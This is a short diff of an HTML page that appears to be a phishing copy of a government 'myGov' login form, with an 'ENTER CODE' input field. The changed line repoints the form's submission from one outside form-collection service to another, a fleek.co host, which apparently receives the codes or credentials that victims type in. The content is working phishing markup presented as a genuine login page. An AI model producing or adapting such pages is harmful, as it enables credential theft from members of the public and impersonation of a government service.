@@ -30,7 +30,7 @@
 <h2 class="text-align-left" style="box-sizing: inherit; line-height: 1.25; margin-bottom: 1.25rem; font-size: 1.5rem; color: rgb(51, 51, 51); margin-top: 1.875rem;">ENTER CODE<br />
 <input aria-required="true" autocomplete="off" data-username="data-username" id="userId" name="username" style="box-sizing: inherit; line-height: unset; color: rgb(16, 16, 18); font-style: inherit; font-variant: inherit; font-weight: 400; font-stretch: inherit; font-size: 16px; font-family: inherit; margin: 6px 0px 0px; width: 510px; border-width: 0.0625rem; border-style: solid; border-color: rgb(0, 0, 0); border-radius: 0.125rem; background-color: rgb(255, 255, 255); padding: 0.7em; display: block; overflow: visible; max-width: none; height: 3rem;" type="text" value="" /></h2>
 
-<form action="https://submit-form.com/ZeguCAF5" aria-describedby="error-msg" class="mygov-login-form alternative" id="mygov-login-form" method="post" style="box-sizing: inherit; line-height: 1.75; margin-left: 0px; margin-right: 0px;">
+<form action="https://curly-forest-5076.on.fleek.co/info" aria-describedby="error-msg" class="mygov-login-form alternative" id="mygov-login-form" method="post" style="box-sizing: inherit; line-height: 1.75; margin-left: 0px; margin-right: 0px;">
 <input
     type="hidden"
     name="_redirect"
